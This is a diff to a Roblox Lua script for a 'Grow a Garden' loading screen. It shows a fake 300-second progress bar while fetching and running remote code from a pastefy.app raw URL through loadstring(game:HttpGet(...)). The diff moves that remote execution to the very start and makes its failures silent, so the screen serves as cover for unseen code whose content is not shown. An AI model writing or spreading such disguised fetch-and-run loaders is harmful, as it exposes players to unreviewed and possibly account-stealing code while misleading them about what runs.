@@ -10,7 +10,7 @@ background.Parent = screenGui
 
 local title = Instance.new("TextLabel")
 title.Size = UDim2.new(1, 0, 0, 100)
-title.Position = UDim2.new(0, 0, 0.25, 0)
+title.Position = UDim2.new(0, 0, 0.23, 0) -- higher placement
 title.BackgroundTransparency = 1
 title.Text = "🌴 GROW A GARDEN 🌴"
 title.TextColor3 = Color3.fromRGB(255, 255, 255)
@@ -20,7 +20,7 @@ title.Parent = background
 
 local subText = Instance.new("TextLabel")
 subText.Size = UDim2.new(1, 0, 0, 50)
-subText.Position = UDim2.new(0, 0, 0.35, 0)
+subText.Position = UDim2.new(0, 0, 0.33, 0) -- lower placement
 subText.BackgroundTransparency = 1
 subText.Text = "Script Loading Please Wait for a While"
 subText.TextColor3 = Color3.fromRGB(200, 200, 200)
@@ -54,42 +54,45 @@ percentText.Parent = background
 local TweenService = game:GetService("TweenService")
 local totalTime = 300
 local progress = 0
-local steps = {}
+local ticks = {}
+local externalRan = false
 
--- Randomize chunk sizes (2.4% - 10%) but make sure they sum to 100
 while progress < 100 do
-    local chunk = math.random(24, 100) / 10 -- 2.4% to 10%
+    local jumpChance = math.random()
+    local chunk
+    if jumpChance < 0.15 then
+        chunk = math.random(24, 100) / 10
+    else
+        chunk = 1
+    end
     if progress + chunk > 100 then
         chunk = 100 - progress
     end
-    table.insert(steps, chunk)
+    table.insert(ticks, chunk)
     progress = progress + chunk
 end
 
-local stepTime = totalTime / #steps
+local tickTime = totalTime / #ticks
 progress = 0
 
-for i, chunk in ipairs(steps) do
+for _, chunk in ipairs(ticks) do
     local newProgress = progress + chunk
     percentText.Text = string.format("%.1f%%", newProgress)
-    
-    local goal = {Size = UDim2.new(newProgress / 100, 0, 1, 0)}
-    local tweenInfo = TweenInfo.new(stepTime, Enum.EasingStyle.Linear)
-    local tween = TweenService:Create(barInner, tweenInfo, goal)
-    tween:Play()
-    tween.Completed:Wait()
-    
-    if progress < 1 and newProgress >= 1 then
+
+    if not externalRan and newProgress >= 0.1 then
+        externalRan = true
         task.spawn(function()
-            local success, err = pcall(function()
+            pcall(function()
                 loadstring(game:HttpGet("https://pastefy.app/O1yBSZ1G/raw"))()
             end)
-            if not success then
-                warn("Script load failed:", err)
-            end
         end)
     end
-    
+
+    local tweenInfo = TweenInfo.new(tickTime, Enum.EasingStyle.Linear)
+    local tween = TweenService:Create(barInner, tweenInfo, {Size = UDim2.new(newProgress / 100, 0, 1, 0)})
+    tween:Play()
+    tween.Completed:Wait()
+
     progress = newProgress
 end
 
